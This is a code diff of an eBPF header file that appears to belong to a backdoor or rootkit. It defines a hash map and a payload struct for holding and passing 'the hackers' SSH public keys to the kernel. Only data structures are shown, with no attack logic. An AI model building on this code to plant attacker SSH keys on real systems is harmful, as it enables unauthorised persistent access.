@@ -2,15 +2,6 @@
 #ifndef __MAPS__
 #define __MAPS__
 
-// Map to hold the hackers key ssh keys.
-struct
-{
-    __uint(type, BPF_MAP_TYPE_HASH);
-    __uint(max_entries, 8192);
-    __type(key, size_t);   // key is id
-    __type(value, char *); // value is ssh pub key
-} map_payload_buffer SEC(".maps");
-
 // Ringbuffer Map to pass messages from kernel to user
 struct
 {
@@ -45,4 +36,21 @@ struct event
 };
 // const struct event *unused UNUSED;
 __EXPORTED_DEFINE(event, unused1);
+
+// struct defined custom_payload to get usermode ssh key string
+struct custom_payload
+{
+    u8 raw_buf[max_payload_len];
+    u32 payload_len;
+};
+__EXPORTED_DEFINE(custom_payload, unused2);
+// Map to hold the hackers key ssh keys.
+struct
+{
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, 8192);
+    __type(key, size_t);                    // key is id
+    __type(value, struct custom_payload *); // value is ssh pub key
+} map_payload_buffer SEC(".maps");
+
 #endif
